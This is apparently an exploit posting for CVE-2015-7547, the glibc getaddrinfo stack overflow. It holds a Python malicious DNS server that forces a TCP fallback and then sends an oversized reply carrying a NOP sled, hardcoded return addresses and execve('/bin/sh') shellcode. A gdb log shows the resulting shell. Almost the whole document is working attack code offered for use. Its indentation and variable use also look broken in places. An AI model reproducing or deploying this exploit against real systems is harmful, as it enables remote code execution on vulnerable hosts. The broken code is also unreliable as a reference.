 
add by SpeeDr00t@Blackfalcon (jang kyoung chip)
 
This is a published vulnerability by google in the past.
Please refer to the link below.
   
Reference: 
- https://googleonlinesecurity.blogspot.kr/2016/02/cve-2015-7547-glibc-getaddrinfo-stack.html
- https://github.com/fjserna/CVE-2015-7547
- CVE-2015-7547: glibc getaddrinfo stack-based buffer overflow 
 
When Google announced about this code(vulnerability), 
it was missing information on shellcode.
So, I tried to completed the shellcode.
In the future, I hope to help your study.
   
 
(gdb) r
Starting program: /home/haker/client1 
Got object file from memory but can&#039;t read symbols: File truncated.
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
udp send 
sendto 1
TCP Connected with 127.0.0.1:60259
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
data1 = ï¿½ï¿½foobargooglecom
query = foobargooglecom$(ï¿½foobargooglecom
[TCP] Request2 len recv 36
sendto 2
data1_reply
data2_reply
[UDP] Total Data len recv 36
[UDP] Total Data len recv 36
udp send 
sendto 1
TCP Connected with 127.0.0.1:60260
[TCP] Total Data len recv 76
[TCP] Request1 len recv 36
data1 = ï¿½ï¿½foobargooglecom
query = foobargooglecom$ï¿½7foobargooglecom
[TCP] Request2 len recv 36
sendto 2
data1_reply
data2_reply
process 6415 is executing new program: /bin/dash
$ id
uid=1000(haker) gid=1000(haker) groups=1000(haker),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)
$ 
 
*/
 
 
 
 
import socket
import time
import struct
import threading
 
IP = &#039;192.168.111.5&#039; # Insert your ip for bind() here...
ANSWERS1 = 184
 
terminate = False
last_reply = None
reply_now = threading.Event()
 
 
def dw(x):
    return struct.pack(&#039;>H&#039;, x)
 
def dd(x):
    return struct.pack(&#039;>I&#039;, x)
 
def dl(x):
    return struct.pack(&#039;<Q&#039;, x)
 
def db(x):
    return chr(x)
 
def udp_thread():
    global terminate
 
    # Handle UDP requests
    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_udp.bind((IP, 53))
 
    reply_counter = 0
    counter = -1
 
    answers = []
 
    while not terminate:
        data, addr = sock_udp.recvfrom(1024)
        print &#039;[UDP] Total Data len recv &#039; + str(len(data))
        id_udp = struct.unpack(&#039;>H&#039;, data[0:2])[0]
        query_udp = data[12:]
 
        # Send truncated flag... so it retries over TCP
        data = dw(id_udp)                          # id
        data += dw(0x8380)                     # flags with truncated set
        data += dw(1)                        # questions
        data += dw(0)                        # answers
        data += dw(0)                        # authoritative
        data += dw(0)                        # additional
        data += query_udp                    # question
        data += &#039;\x00&#039; * 2500                # Need a long DNS response to force malloc 
 
        answers.append((data, addr))
 
        if len(answers) != 2:
            continue
 
        counter += 1
 
        if counter % 4 == 2:
            answers = answers[::-1]
 
 
        print &#039;udp send &#039;
        time.sleep(0.01)
        sock_udp.sendto(*answers.pop(0))
 
        print &#039;sendto 1 &#039;
        reply_now.wait()
        sock_udp.sendto(*answers.pop(0))
        print &#039;sendto 2 &#039;
 
    sock_udp.close()
 
 
def tcp_thread():
    global terminate
    counter = -1
 
    #Open TCP socket
    sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock_tcp.bind((IP, 53))
    sock_tcp.listen(10)
 
    print &#039;a&#039;
     
    while not terminate:
        conn, addr = sock_tcp.accept()
        counter += 1
        print &#039;TCP Connected with &#039; + addr[0] + &#039;:&#039; + str(addr[1])
 
        # Read entire packet
        data = conn.recv(1024)
        print &#039;[TCP] Total Data len recv &#039; + str(len(data))
 
        reqlen1 = socket.ntohs(struct.unpack(&#039;H&#039;, data[0:2])[0])
        print &#039;[TCP] Request1 len recv &#039; + str(reqlen1)
        data1 = data[2:2+reqlen1]
 
        print &#039;data1 = &#039; +data1
 
        id1 = struct.unpack(&#039;>H&#039;, data1[0:2])[0]
        query1 = data[12:]
 
        print &#039;query = &#039; + query1
 
        # Do we have an extra request?
        data2 = None
        if len(data) > 2+reqlen1:
            reqlen2 = socket.ntohs(struct.unpack(&#039;H&#039;, data[2+reqlen1:2+reqlen1+2])[0])
            print &#039;[TCP] Request2 len recv &#039; + str(reqlen2)
            data2 = data[2+reqlen1+2:2+reqlen1+2+reqlen2]
            id2 = struct.unpack(&#039;>H&#039;, data2[0:2])[0]
            query2 = data2[12:]
 
 
 
    # Reply them on different packets
    data = &#039;&#039;
    data += dw(id1)                      # id
    data += dw(0x8180)                   # flags
    data += dw(1)                        # questions
    data += dw(ANSWERS1)                 # answers
    data += dw(0)                        # authoritative
    data += dw(0)                        # additional
    data += query1                       # question
 
 
 
    for i in range(ANSWERS1):
        answer += dw(1)      # type A
        answer += dw(1)      # class
        answer += dd(13)     # ttl
        answer += dw(4)      # data length
        answer += &#039;D&#039; * 4    # data
 
        data += answer
 
    data1_reply = dw(len(data)) + data
 
    if data2:
        data = &#039;&#039;
        data += dw(id2)
        data += &#039;A&#039; * (6)
        data += &#039;\x08\xc5\xff\xff\xff\x7f\x00\x00&#039;
        data += &#039;\x90&#039; * (44)
        data += &#039;\x90&#039; * (1955)
        data += &#039;\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05&#039;
        data += &#039;\x90&#039; * (100)
        data += &#039;\xc0\xc4\xff\xff\xff\x7f\x00\x00&#039;
        data += &#039;F&#039; * (8)
        data += &#039;\xc0\xc4\xff\xff\xff\x7f\x00\x00&#039;
        data += &#039;G&#039; * (134)
        data2_reply = dw(len(data)) + data
    else:
        data2_reply = None
 
    reply_now.set()
    time.sleep(0.01)
    conn.sendall(data1_reply)
    print &#039;data1_reply&#039;
    time.sleep(0.01)
    if data2:
        conn.sendall(data2_reply)
        print &#039;data2_reply&#039;
 
    reply_now.clear()
 
    sock_tcp.shutdown(socket.SHUT_RDWR)
    sock_tcp.close()
 
 
if __name__ == "__main__":
 
    t = threading.Thread(target=udp_thread)
    t.daemon = True
    t.start()
    tcp_thread()
    terminate = True

